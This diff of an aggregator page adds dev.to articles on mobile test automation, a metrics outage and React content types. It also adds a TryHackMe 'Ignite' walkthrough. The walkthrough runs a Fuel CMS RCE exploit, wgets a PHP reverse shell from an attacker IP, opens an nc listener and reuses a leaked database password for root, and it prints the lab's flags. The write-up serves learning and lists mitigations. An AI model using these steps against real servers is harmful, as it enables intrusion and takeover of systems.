@@ -175,24 +175,662 @@ footer{text-align:center;color:#64748b;font-size:14px;padding:30px 0;border-top:
     </div>
     <div class="article-body"><img src="https://www.japantimes.co.jp/japantimes/uploads/images/2026/11/01/571673.JPG" alt="North Korea fires off cluster bomb warheads in latest ‘major’ weapons test" loading="lazy">Pyongyang claimed the warhead is "capable of turning into ashes a target area of 12 to 13 hectares."</div>
 </article>
-<article class="article-card" id="artikel-3287">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Japan demands release of national in meeting with Russia’s Lavrov", "image": ["https://www.japantimes.co.jp/japantimes/uploads/images/2026/11/01/571647.jpg"], "datePublished": "2026-11-01T12:43:00+09:00", "dateModified": "2026-11-01T12:43:00+09:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3287"}</script>
-    <h2>Japan demands release of national in meeting with Russia’s Lavrov</h2>
+<article class="article-card" id="artikel-7244">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Test Automation with agent-device (Part 3)", "image": [], "datePublished": "2026-11-01T13:08:42+00:00", "dateModified": "2026-11-01T13:08:42+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7244"}</script>
+    <h2>Test Automation with agent-device (Part 3)</h2>
     <div class="article-meta">
         📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.japantimes.co.jp/news/2026/11/01/japan/politics/japan-russia-g20-meeting/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+        <a href="https://dev.to/krenin88/test-automation-with-agent-device-part-3-195i" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
     </div>
-    <div class="article-body"><img src="https://www.japantimes.co.jp/japantimes/uploads/images/2026/11/01/571647.jpg" alt="Japan demands release of national in meeting with Russia’s Lavrov" loading="lazy">The rare high-level meeting between the two countries came amid strained ties over Ukraine and a long-running territorial dispute.</div>
+    <div class="article-body"><p>This post covers saving test flows as agent-device .ad scripts and running them again, using a Flutter app. It goes through writing an .ad file, getting the app into the right state before a replay, reading the report when a replay stops and fixing it, and the token cost of agent-driven QA. It is based on agent-device 0.21.31 (2026-10-25).</p>
+
+<p>Installation and the basic loop are in <a href="https://dev.to/krenin88/test-automation-with-agent-device-part-1-7nj">Part 1</a>, and real-device setup is in <a href="https://dev.to/krenin88/test-automation-with-agent-device-part-2-1noa">Part 2</a>.</p>
+
+<h2>
+  
+  
+  What an .ad file is
+</h2>
+
+<p>When an agent checks an app, it reads the screen, picks the next thing to tap, and reads the result, over and over. Exploring the same flow this way every time keeps costing time and tokens. An .ad file pins down the result of that exploration as a list of commands, and replay runs the list from top to bottom.</p>
+
+<p>Each line has the form &lt;command&gt; [positional...] [flag...], the same as an agent-device command in the terminal. Quoting follows shell rules too, so a selector containing spaces is wrapped like 'label="..."'. Below is the start of a flow that opens the app fresh, taps a button on the first screen, types into an input, and checks the result screen.<br>
+</p>
+
+
+
+
+# First-run flow — the app ID comes in via -e APP=
+open ${APP} --relaunch
+wait 'label="&lt;first-screen button&gt;"' 30000
+press 'label="&lt;first-screen button&gt;"'
+fill 'id="find-input"' "&lt;text to type&gt;"
+press 'label="&lt;search button&gt;" role=button'
+wait 'label="&lt;result title&gt;"' 60000
+wait text "&lt;text the result should show&gt;" 10000
+back
+close
+
+
+
+
+
+
+<p>A few notes:</p>
+
+<ul>
+<li>
+<strong># comments work.</strong> The docs do not say so, so the first line was a comment in a test replay, and it passed.</li>
+<li>
+<strong>Do not hard-code the app ID.</strong> Leave it as ${APP} and pass -e APP=&lt;bundle id&gt; at replay time, and the same file works for builds with different IDs, such as a dev build and a release build.</li>
+<li>
+<strong>The number after wait is a timeout in milliseconds.</strong> Give a long one to steps that wait on the network or on model inference.</li>
+<li>
+<strong>Device-selection flags stay out of the file.</strong> --platform, --serial, --device, and --settle are not part of a script step; they go on the replay command.</li>
+</ul>
+
+<p>There are two ways to make an .ad file. You can start recording with open &lt;bundle id&gt; --relaunch --save-script=&lt;file&gt;.ad, go through the flow, and save with session save-script, or you can write it by hand. The 24-step flow in this post was written by hand, based on a flow the agent had already passed manually.</p>
+
+<h2>
+  
+  
+  Getting to a "first launch" state before replaying
+</h2>
+
+<p>replay only runs the commands written down; it does not reset the app. If the flow starts by checking the first-launch consent dialog, an app that still remembers an earlier consent stops right at step 2. So a separate runner script deletes and reinstalls the app before each replay.<br>
+</p>
+
+
+
+
+<span># Android emulator</span>
+adb <span>-s</span> &lt;serial&gt; uninstall &lt;bundle <span>id</span><span>&gt;</span>
+adb <span>-s</span> &lt;serial&gt; <span>install</span> <span>-r</span> &lt;apk path&gt;
+adb <span>-s</span> &lt;serial&gt; shell cmd locale set-app-locales &lt;bundle <span>id</span><span>&gt;</span> <span>--locales</span> en-US
+agent-device replay &lt;file&gt;.ad <span>--platform</span> android <span>--serial</span> &lt;serial&gt; <span>-e</span> <span>APP</span><span>=</span>&lt;bundle <span>id</span><span>&gt;</span> <span>--timeout</span> 240000
+
+<span># iOS simulator</span>
+xcrun simctl uninstall &lt;UDID&gt; &lt;bundle <span>id</span><span>&gt;</span>
+xcrun simctl <span>install</span> &lt;UDID&gt; &lt;Runner.app path&gt;
+agent-device replay &lt;file&gt;.ad <span>--platform</span> ios <span>--udid</span> &lt;UDID&gt; <span>-e</span> <span>APP</span><span>=</span>&lt;bundle <span>id</span><span>&gt;</span> <span>--timeout</span> 300000
+
+
+
+
+
+
+<p>On Android, set-app-locales opens just this app in English while leaving the device language alone. On the iOS simulator no per-app language command was used, so the app follows the simulator's language setting. replay has a default work budget of 60 seconds, so raise it with --timeout for longer flows.</p>
+
+<p>Deleting the app also deletes its data. So the runner script accepts only the designated test emulators (checked by name with adb -s &lt;serial&gt; emu avd name) and simulator UDIDs, and stops with exit code 2 if it gets any other device or an app ID outside your own. An emulator serial such as emulator-5554 is assigned in boot order and does not tell you which AVD it is, which is why the check uses the name.</p>
+
+<p>With that in place, the 24-step flow finished with Replayed 24 steps on both runs on each platform: 8.8 and 9.4 seconds on the Android emulator, 13.9 and 14.0 seconds on the iOS simulator.</p>
+
+<h2>
+  
+  
+  When a replay stops
+</h2>
+
+<p>When a replay gets stuck partway, it fails with REPLAY_DIVERGENCE. The report includes the step number and its line, the actionable elements on screen at that moment, and selector suggestions for that screen. So you do not have to start over after a fix, it also tells you how to resume with replay --from &lt;step&gt; --plan-digest &lt;value&gt;. When no automatic repair is possible, it says Repair hint: manual.</p>
+
+<p><strong>A first-launch system dialog.</strong> The flow that passed on Android stopped at step 2 the first time it ran on the iOS simulator.<br>
+</p>
+
+
+
+
+Error (REPLAY_DIVERGENCE): Replay failed at step 2 (wait "label=\"&lt;first-screen button&gt;\"" 30000): wait timed out for selector: ...
+Current surface: Allow "&lt;app name&gt;" to track your activity across other companies' apps ...
+
+
+
+
+
+
+<p>The report's Current surface showed the App Tracking Transparency (ATT) dialog. It is a system dialog that appears on first launch only on iOS, so the flow written against Android had no step for it. After closing it with agent-device alert dismiss and replaying again, the run got past this step. The runner script does not handle it, so on builds that show this dialog, close it before replaying.</p>
+
+<p><strong>Input role names that differ by platform.</strong> Next, the replay stopped at the fill in step 5. The first selector was role=text-field, which matched on Android, but the iOS simulator exposed the same input as an other element with a label. To find one selector that works on both platforms, these were tried in order:</p>
+
+<ol>
+<li>
+editable=true — passed on Android, Selector did not match on iOS</li>
+<li>
+role=textfield || role=text-field — || is the "or" syntax that appeared in the report's selector suggestions. It still did not match on iOS.</li>
+<li>Adding Semantics(identifier:) to the Flutter widget — passed on both platforms</li>
+</ol>
+
+<p>The last fix is one line of app code: identifier: 'find-input' added to the existing Semantics around the input, with no visible change on screen. The selector becomes id="find-input". As noted in Part 1, a Flutter Key does not show up in the accessibility tree, so adding an identifier is the reliable way to run the same script on both platforms.</p>
+
+<h2>
+  
+  
+  Token cost and the rules for cutting it
+</h2>
+
+<p>Token cost was the reason for using .ad in the first place. Most of the cost of agent-driven QA came not from output but from cache reads. A cache read is the earlier conversation the agent re-reads on every response. The first real-device check of two apps took about 40 minutes and came to 121 responses, 77,985 output tokens, and 30,225,404 cache-read tokens, roughly 250,000 tokens re-read per response.</p>
+
+<p>The QA agent was already on Sonnet, so the model was not the cause. In the same stretch, 11 screenshots were read into the conversation, and as the context grew, every response re-read more. So five rules went into the QA agent's instructions:</p>
+
+<ol>
+<li>Save a flow as .ad the first time it passes, and use replay from then on. When it gets stuck, fix only that step using the divergence report.</li>
+<li>Act with --settle and look only at the returned diff. Do not read the full screen tree.</li>
+<li>Save screenshots to files only, and read at most one per item into the conversation.</li>
+<li>End the session per item: one app, one thing to check. Past 40 responses, it is time to stop.</li>
+<li>Read logs and build output with grep or tail, only the lines you need.</li>
+</ol>
+
+<p>The batch after the rules (three emulator checks, an iPhone attempt, an Android real device, about 30 minutes) came to 105 responses, 44,113 output tokens, and 19,171,162 cache-read tokens, about 180,000 cache-read tokens per response. The items checked were different, so the two sets of numbers cannot be compared directly, and the 40-response limit was not met. Tokens after adopting .ad have not been measured separately yet, and neither replay on a real device nor running it in CI has been tried.</p>
+
+<h2>
+  
+  
+  References
+</h2>
+
+<ul>
+<li>agent-device repository: <a href="https://github.com/callstack/agent-device">https://github.com/callstack/agent-device</a>
+</li>
+<li>agent-device agent setup docs: <a href="https://oss.callstack.com/agent-device/docs/agent-setup">https://oss.callstack.com/agent-device/docs/agent-setup</a>
+</li>
+<li>Flutter SemanticsProperties.identifier: <a href="https://api.flutter.dev/flutter/semantics/SemanticsProperties/identifier.html">https://api.flutter.dev/flutter/semantics/SemanticsProperties/identifier.html</a>
+</li>
+</ul></div>
 </article>
-<article class="article-card" id="artikel-3885">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Clarify crime thresholds and immunity in bid-rigging law: Hong Kong Bar Association", "image": ["https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/0eafb7d1-9ff3-49a7-8cc6-379093d01d74_7a3ecf19.jpg?itok=LcT_UUYw&v=1793534966"], "datePublished": "2026-11-01T12:36:05+00:00", "dateModified": "2026-11-01T12:36:05+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3885"}</script>
-    <h2>Clarify crime thresholds and immunity in bid-rigging law: Hong Kong Bar Association</h2>
+<article class="article-card" id="artikel-7245">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "This Box's Homepage Named Its Own CVE — Ignite (TryHackMe)", "image": [], "datePublished": "2026-11-01T13:08:18+00:00", "dateModified": "2026-11-01T13:08:18+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7245"}</script>
+    <h2>This Box&#x27;s Homepage Named Its Own CVE — Ignite (TryHackMe)</h2>
     <div class="article-meta">
         📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.scmp.com/news/hong-kong/law-and-crime/article/3372894/clarify-crime-thresholds-and-immunity-bid-rigging-law-hong-kong-bar-association" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+        <a href="https://dev.to/cyberfarhan/this-boxs-homepage-named-its-own-cve-ignite-tryhackme-1l6c" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
     </div>
-    <div class="article-body"><img src="https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/0eafb7d1-9ff3-49a7-8cc6-379093d01d74_7a3ecf19.jpg?itok=LcT_UUYw&amp;v=1793534966" alt="Clarify crime thresholds and immunity in bid-rigging law: Hong Kong Bar Association" loading="lazy">The Hong Kong Bar Association has called on the government to clearly define criminal thresholds and resolve whistle-blower immunity rules under its plan to outlaw bid-rigging following the deadly Tai Po inferno.
-A task force formed by the association, which represents the city’s barristers, spent 10 months reviewing four key areas of law and published a 140-page report on Sunday in the hope of providing direction to address the shortcomings that led to the deadly Wang Fuk Court blaze last...</div>
+    <div class="article-body"><p><strong>Platform:</strong> TryHackMe · <strong>Difficulty:</strong> Easy · <strong>Category:</strong> Fuel CMS RCE / Credential Reuse</p>
+
+<h2>
+  
+  
+  Introduction
+</h2>
+
+<p>The page title says "Welcome to FUEL CMS." Not a generic landing page, not a logo with no text — the literal CMS name, in the &lt;title&gt; tag, for anyone running curl to read. That's either refreshingly honest or a significant operational security failure, and either way it meant I could skip version fingerprinting entirely and go straight to searchsploit.</p>
+
+<p><strong>Ignite</strong> carries a well-documented unauthenticated RCE in Fuel CMS 1.4.1, and once that door opens, the rest of the box leans on a mistake seen constantly in real engagements: a database credential, sitting in plaintext in a configuration file, reused verbatim as the root system password. No clever escalation chain required — just reading a file everyone forgets is sensitive because "it's just a config file."</p>
+
+<h2>
+  
+  
+  Recon
+</h2>
+
+
+
+
+
+
+rustscan <span>-a</span> 10.49.166.110 <span>-r</span> 1-65535 <span>--ulimit</span> 5000 <span>--</span> <span>-Pn</span> <span>-sC</span> <span>-sV</span>
+
+
+
+
+
+
+
+
+
+
+
+Port
+Service
+Version
+
+
+
+
+80/tcp
+HTTP
+Apache httpd 2.4.18 (Ubuntu) — "Welcome to FUEL CMS"
+
+
+
+
+<p>A single open port. The HTTP title removes any ambiguity about what's running.<br>
+</p>
+
+
+
+
+feroxbuster <span>-u</span> http://10.49.166.110/ <span>\</span>
+  <span>-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span>\</span>
+  <span>-x</span> php,xt,html
+
+
+
+
+
+
+
+
+
+
+
+301  /fuel             # admin panel root
+200  /fuel/login       # login form
+302  /fuel/dashboard  →  /fuel/login/&lt;token&gt;   # auth-gated, redirects when unauthenticated
+
+
+
+
+
+
+<p>The /fuel/ admin structure is fully exposed, confirming the CMS identity. No version number is directly visible on the page, but the title alone is enough to search for known exploits.</p>
+
+<h2>
+  
+  
+  Foothold
+</h2>
+
+<p>Fuel CMS versions up to and including 1.4.1 contain a flaw in how the application evaluates certain input — an attacker can manipulate request parameters such that arbitrary PHP code is evaluated server-side, without any authentication. This was assigned CVE-2018-16763 and has multiple public proof-of-concept exploits.</p>
+
+<p>Searching local Exploit-DB mirror for Fuel CMS exploits:<br>
+</p>
+
+
+
+
+searchsploit fuel cms
+
+
+
+
+
+
+
+
+
+
+
+Fuel CMS 1.4.1 - Remote Code Execution (1)   linux/webapps/47138.py
+Fuel CMS 1.4.1 - Remote Code Execution (2)   php/webapps/49487.rb
+Fuel CMS 1.4.1 - Remote Code Execution (3)   php/webapps/50477.py
+
+
+
+
+
+
+<p>Copying the third RCE script locally:<br>
+</p>
+
+
+
+
+searchsploit <span>-m</span> php/webapps/50477.py
+
+
+
+
+
+
+<p>Running the exploit against the target:<br>
+</p>
+
+
+
+
+python 50477.py <span>-u</span> http://10.49.166.110
+
+
+
+
+
+
+
+
+
+
+
+[+]Connecting...
+Enter Command $
+
+
+
+
+
+
+<p>An interactive pseudo-shell, command-by-command — not a full reverse shell, but enough to stage one.</p>
+
+<p>Confirming basic command execution:<br>
+</p>
+
+
+
+
+<span>Enter Command $</span><span>ls</span>
+<span>README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
+
+</span><span>Enter Command $</span><span>pwd</span>
+<span>/var/www/html
+</span>
+
+
+
+
+
+<h2>
+  
+  
+  Shell / Access
+</h2>
+
+<p>The exploit's pseudo-shell is functional but limited — no interactivity for tools requiring a TTY, no persistence. The standard move: use it to pull down a real PHP reverse shell via wget, then trigger that file directly over HTTP.</p>
+
+<p>Serving the PHP reverse shell from the attacking machine:<br>
+</p>
+
+
+
+
+python3 <span>-m</span> http.server 80
+
+
+
+
+
+
+<p>Downloading it via the pseudo-shell:<br>
+</p>
+
+
+
+
+Enter Command <span>$wget</span> http://192.168.134.217/php-reverse-shell.php
+
+
+
+
+
+
+<p>The download fired repeatedly (visible as .1, .2, .3... duplicate files in the listing) — the exploit script appears to issue the command multiple times internally, which is harmless here since wget simply creates incrementing filenames rather than failing.</p>
+
+<p>Confirming the file landed:<br>
+</p>
+
+
+
+
+Enter Command $ls
+... php-reverse-shell.php  php-reverse-shell.php.1  ... php-reverse-shell.php.12 ...
+
+
+
+
+
+
+<p>Setting up the listener, then triggering the original (non-duplicated) file directly:<br>
+</p>
+
+
+
+
+nc <span>-nvlp</span> 4444
+
+
+
+
+
+
+
+
+
+
+
+# browser/curl: http://10.49.166.110/php-reverse-shell.php
+
+
+
+
+
+
+
+
+
+
+
+connect to [192.168.134.217] from (UNKNOWN) [10.49.166.110] 38770
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+
+
+
+<p>Stabilising:<br>
+</p>
+
+
+
+
+python <span>-c</span> <span>'import pty; pty.spawn("/bin/bash")'</span>
+
+
+
+
+
+
+<p>Collecting the user flag:<br>
+</p>
+
+
+
+
+<span>cat</span> /home/www-data/flag.txt
+<span># 6470e394cbf6dab6a91682cc8585059b</span>
+
+
+
+
+
+
+<h2>
+  
+  
+  Escalation
+</h2>
+
+<p>Standard CodeIgniter/Fuel CMS structure places database credentials in a predictable config file:<br>
+</p>
+
+
+
+
+<span>cd</span> /var/www/html/fuel/application/config
+<span>cat </span>database.php
+
+
+
+
+
+
+
+
+
+
+
+<span>$db</span><span>[</span><span>'default'</span><span>]</span> <span>=</span> <span>array</span><span>(</span>
+    <span>'hostname'</span> <span>=&gt;</span> <span>'localhost'</span><span>,</span>
+    <span>'username'</span> <span>=&gt;</span> <span>'root'</span><span>,</span>
+    <span>'password'</span> <span>=&gt;</span> <span>'mememe'</span><span>,</span>
+    <span>'database'</span> <span>=&gt;</span> <span>'fuel_schema'</span><span>,</span>
+    <span>...</span>
+<span>);</span>
+
+
+
+
+
+
+<p>MySQL root password: mememe. Worth testing immediately against the Linux accounts — database and system credential reuse is depressingly common.</p>
+
+<p>First attempt — sudo su with the DB password:<br>
+</p>
+
+
+
+
+<span>sudo </span>su
+<span># [sudo] password for www-data: mememe</span>
+<span># Sorry, try again. (x3)</span>
+
+
+
+
+
+
+<p>www-data has no valid sudo password matching this — expected, since www-data typically has no interactive login credentials at all.</p>
+
+<p>Second attempt — su directly to root:<br>
+</p>
+
+
+
+
+su
+<span># Password: mememe</span>
+
+
+
+
+
+
+
+
+
+
+
+root@ubuntu:~# <span>cat </span>root.txt
+b9bbcb33e11b80be759c4e844862482d
+
+
+
+
+
+
+<p>The MySQL root password and the Linux root password are identical.</p>
+
+<h2>
+  
+  
+  Exploitation — The Full Chain
+</h2>
+
+<ol>
+<li>
+<strong>Page title</strong> identified Fuel CMS directly; searchsploit found CVE-2018-16763</li>
+<li>
+<strong>EDB-50477</strong> exploit → pseudo-shell, no authentication required</li>
+<li>
+<strong>wget from pseudo-shell</strong> → staged a full PHP reverse shell in the webroot</li>
+<li>
+<strong>HTTP trigger</strong> → reverse shell as www-data → user flag</li>
+<li>
+<strong>application/config/database.php</strong> → MySQL root password mememe
+</li>
+<li>
+<strong>su (not sudo su)</strong> → password reuse → Linux root → root flag</li>
+</ol>
+
+<h2>
+  
+  
+  Rabbit Holes
+</h2>
+
+<p><strong>sudo su before plain su.</strong> The first escalation attempt used sudo su, which failed three times with the correct-looking password. The distinction matters: sudo asks for the <em>calling user's own</em> password (here, www-data, which has no usable interactive password), while su asks for the <em>target user's</em> password (root's own password). Since the leaked credential was reused as root's actual login password — not as a sudo grant for www-data — only the second form worked. A useful general reminder: when a found password doesn't work with sudo, try it with su before assuming it's the wrong credential entirely.</p>
+
+<p><strong>Duplicate file downloads via the exploit's wget command.</strong> Running the wget command once through the pseudo-shell apparently issued the underlying HTTP request multiple times internally (resulting in php-reverse-shell.php.1 through .12), based on the directory listing immediately afterward. This didn't cause any functional problem — the original un-suffixed file was still valid and triggered the shell correctly — but it's a quirk worth expecting when using this particular exploit script.</p>
+
+<h2>
+  
+  
+  Flags
+</h2>
+
+
+
+
+
+
+Flag
+Value
+Location
+
+
+
+
+User
+6470e394cbf6dab6a91682cc8585059b
+/home/www-data/flag.txt
+
+
+Root
+b9bbcb33e11b80be759c4e844862482d
+/root/root.txt
+
+
+
+
+<h2>
+  
+  
+  Mitigations
+</h2>
+
+
+
+
+
+
+Vulnerability
+Severity
+Mitigation
+
+
+
+
+Fuel CMS 1.4.1 unauthenticated RCE (CVE-2018-16763)
+Critical
+Update Fuel CMS to a patched release; subscribe to CMS-specific security advisories
+
+
+CMS identity disclosed directly in page title
+Low
+Avoid exposing exact CMS name/version in publicly visible page metadata where avoidable
+
+
+Database credentials stored in plaintext config file
+High
+Use environment variables or a secrets manager for database credentials rather than committing them to a readable PHP config file
+
+
+Database root password reused as system root password
+Critical
+Never reuse credentials across different privilege boundaries (database vs. OS); use unique, randomly generated passwords for each
+
+
+
+
+<h2>
+  
+  
+  Key Takeaway
+</h2>
+
+<p>When a discovered credential fails against sudo, try it against su before discarding it — the two commands check entirely different passwords (the caller's vs. the target account's), and a credential leaked from an application config file is far more likely to match a direct account password than a sudo grant for an unrelated service account.</p>
+
+
+
+
+<p><strong>Room:</strong> TryHackMe — Ignite</p></div>
 </article>
 <div style="text-align:center;margin:20px 0;">
     <script type="text/javascript">
@@ -207,6 +845,1271 @@ A task force formed by the association, which represents the city’s barristers
     <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
 </div>
 
+<article class="article-card" id="artikel-7249">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "One slow count query took every metric our dispatch service had off the dashboard", "image": [], "datePublished": "2026-11-01T13:06:36+00:00", "dateModified": "2026-11-01T13:06:36+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7249"}</script>
+    <h2>One slow count query took every metric our dispatch service had off the dashboard</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://dev.to/sergey_shinder_ab2d943365/one-slow-count-query-took-every-metric-our-dispatch-service-had-off-the-dashboard-2n0a" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>During a database slowdown in September our dispatch service failed about one request in six for twenty minutes, and our error rate alert never fired. When we opened the dashboard afterwards, it had a gap over exactly those twenty minutes. No data at all, on every panel the service had.</p>
+
+<p>The service exposes its metrics for Prometheus to scrape every fifteen seconds, with the default scrape timeout of ten. Two years earlier we had added a gauge for the number of dispatches waiting to go out, implemented as a custom collector that ran a count query against the database each time the endpoint was read. Every one of eight pods ran it, and both of our Prometheus replicas scraped every pod, so the database answered that same question about once a second. On a normal day it took a third of a second.</p>
+
+<p>When the database slowed down that query took around fourteen seconds. Prometheus gave up at ten, and a scrape that times out is a failed scrape, all of it. The target's up series went to zero, and Prometheus marked every series it had collected from that target as stale, the request counters and latency histograms as well as the one gauge that was slow. Our error rate alert divided one rate by another, and with no samples on either side there was nothing to compare with the threshold. The alert that did fire was TargetDown, five minutes in, routed as a ticket because a missing target is usually a deploy.</p>
+
+<p>Meanwhile sixteen count queries every fifteen seconds were adding load to a database that was already struggling.</p>
+
+<p>The pending count now comes from one place. A small background task in a single instance runs the query every thirty seconds with its own timeout and publishes the result, and the service's metrics endpoint serves only values it already holds in memory. We alert when scrape_duration_seconds for any target passes half its timeout. And TargetDown for a service carrying live traffic now pages, because we learned it can be the only thing still speaking.</p>
+
+<p>A metrics endpoint that depends on the system it measures will go quiet exactly when that system is in trouble, and it can take everything else it reports down with it.</p>
+
+<p>– Sergey Shinder</p></div>
+</article>
+<article class="article-card" id="artikel-7251">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "635 paragraphs on our site cannot contain a link, because the page body is data and not JSX", "image": [], "datePublished": "2026-11-01T13:05:20+00:00", "dateModified": "2026-11-01T13:05:20+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7251"}</script>
+    <h2>635 paragraphs on our site cannot contain a link, because the page body is data and not JSX</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://dev.to/daniel_pertu/635-paragraphs-on-our-site-cannot-contain-a-link-because-the-page-body-is-data-and-not-jsx-1dio" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>Our marketing site has 72 URLs in <a href="https://pub-trivia.app/sitemap.xml">its sitemap</a>. 67 of them render their body from this type:<br>
+</p>
+
+
+
+
+<span>export</span> <span>type</span> <span>ContentSection</span> <span>=</span> <span>{</span>
+    <span>heading</span><span>:</span> <span>string</span>
+    <span>paragraphs</span><span>:</span> <span>string</span><span>[]</span>
+    <span>points</span><span>?:</span> <span>{</span> <span>term</span><span>:</span> <span>string</span><span>;</span> <span>detail</span><span>:</span> <span>string</span> <span>}[]</span>
+<span>}</span>
+
+
+
+
+
+
+<p>A page file contains an array of those and nothing else that is visual. The component that turns them into HTML is about thirty lines: an h2, a stack of p, and an optional dl for the points. There is no className prop on a section, no heading level argument, no slot for arbitrary children.</p>
+
+<p>The five pages that do not use it are the homepage, /about and the three legal documents, which are hand written.</p>
+
+<h2>
+  
+  
+  What that produced, measured from the live HTML
+</h2>
+
+<p>I fetched all 72 pages and counted the rendered markup rather than the source:<br>
+</p>
+
+
+
+
+pages with sections                 67
+sections                           388
+body paragraphs                    635
+points lists                        21
+terms inside them                  166
+most sections on one page            8
+
+
+
+
+
+
+<p>1.64 paragraphs per section. 21 of 388 sections use the optional list, which is roughly the proportion I would have guessed when writing the type: most of this is prose, and the list is for the handful of things that are genuinely enumerable.</p>
+
+<p>The four pages with eight sections are all guides. Nothing on the site has nine, which is not a limit anybody implemented.</p>
+
+<h2>
+  
+  
+  The constraint I did not design on purpose
+</h2>
+
+<p>paragraphs is string[]. A string cannot contain an anchor. So a page written through this type cannot have a link inside its prose. Not "should not", cannot: there is nowhere to put one.</p>
+
+<p>I checked the rendered output for all 72 pages, looking inside every paragraph the component emits:<br>
+</p>
+
+
+
+
+body paragraphs rendered by the component   635
+...containing an &lt;a&gt;                          0
+
+
+
+
+
+
+<p>The only body paragraph on the whole site with a link in it is on /about, which is one of the five hand written pages. 635 to nothing is not a coincidence, it is a type.</p>
+
+<p>That cuts both ways and I want to be fair about both.</p>
+
+<p>What it buys: the typography lives in one component, so no page can invent a new heading size, and a section with a heading and no words under it is visible as paragraphs: [] in the source. It also means the copy is countable. Every audit I have run on this site, word counts, banned phrases, duplicate sentences, exclamation marks, was possible because the prose is data in a file rather than text interleaved with markup.</p>
+
+<p>What it costs: in-prose contextual links are the single most frequently recommended internal linking tactic there is, and we have none. Every link on these pages is structural, in the header, the breadcrumb, the related-pages block at the bottom, or the call to action. A crawler reading one of our guides sees a page that mentions nine related concepts and links to none of them from the sentence doing the mentioning.</p>
+
+<p>That is a real cost, and it was not a decision. It fell out of a type I wrote to solve a typography problem.</p>
+
+<h2>
+  
+  
+  The keys are the content
+</h2>
+
+<p>One detail in the component that I would not write again:<br>
+</p>
+
+
+
+
+<span>{</span><span>sections</span><span>.</span><span>map</span><span>((</span><span>section</span><span>)</span> <span>=&gt;</span> <span>(</span>
+  <span>&lt;</span><span>section</span> <span>key</span><span>=</span><span>{</span><span>section</span><span>.</span><span>heading</span><span>}</span><span>&gt;</span>
+    ...
+    <span>{</span><span>section</span><span>.</span><span>paragraphs</span><span>.</span><span>map</span><span>((</span><span>paragraph</span><span>)</span> <span>=&gt;</span> <span>(</span>
+      <span>&lt;</span><span>p</span> <span>key</span><span>=</span><span>{</span><span>paragraph</span><span>}</span> <span>...</span><span>&gt;</span><span>{</span><span>paragraph</span><span>}</span><span>&lt;/</span><span>p</span><span>&gt;</span>
+    <span>))</span><span>}</span>
+
+
+
+
+
+
+<p>The React key for a section is its heading. The key for a paragraph is the entire paragraph. The key for a point is its term. So two identical paragraphs inside one section, or two sections with the same heading on one page, are a duplicate key warning and a reconciliation bug waiting for an editor to write the same sentence twice.</p>
+
+<p>I measured that too, across all 388 sections: zero sections contain a repeated paragraph. The content satisfies a constraint nobody wrote down, which is the most fragile kind of correct.</p>
+
+<p>The fix is boring. These lists are static, server rendered, and never reordered, so the index is a perfectly good key and cannot collide:<br>
+</p>
+
+
+
+
+<span>{</span><span>section</span><span>.</span><span>paragraphs</span><span>.</span><span>map</span><span>((</span><span>paragraph</span><span>,</span> <span>i</span><span>)</span> <span>=&gt;</span> <span>(</span>
+  <span>&lt;</span><span>p</span> <span>key</span><span>=</span><span>{</span><span>i</span><span>}</span> <span>...</span><span>&gt;</span><span>{</span><span>paragraph</span><span>}</span><span>&lt;/</span><span>p</span><span>&gt;</span>
+<span>))}</span>
+
+
+
+
+
+
+<p>Using content as a key is a habit people pick up from the lint rule that complains about index keys. The rule is right about reorderable client lists and wrong about a prerendered document.</p>
+
+<h2>
+  
+  
+  What I would actually change
+</h2>
+
+<p>Not the type. The temptation is paragraphs: (string | ReactNode)[], and the moment that lands, the prose stops being data: no word count, no duplicate detection, no banned phrase test, because half of it is now a React element.</p>
+
+<p>The version I would ship instead keeps the strings and adds a narrow seam:<br>
+</p>
+
+
+
+
+<span>type</span> <span>ContentSection</span> <span>=</span> <span>{</span>
+  <span>heading</span><span>:</span> <span>string</span>
+  <span>paragraphs</span><span>:</span> <span>string</span><span>[]</span>
+  <span>/** Phrases in this section's prose to link, once each. */</span>
+  <span>links</span><span>?:</span> <span>{</span> <span>phrase</span><span>:</span> <span>string</span><span>;</span> <span>href</span><span>:</span> <span>string</span> <span>}[]</span>
+<span>}</span>
+
+
+
+
+
+
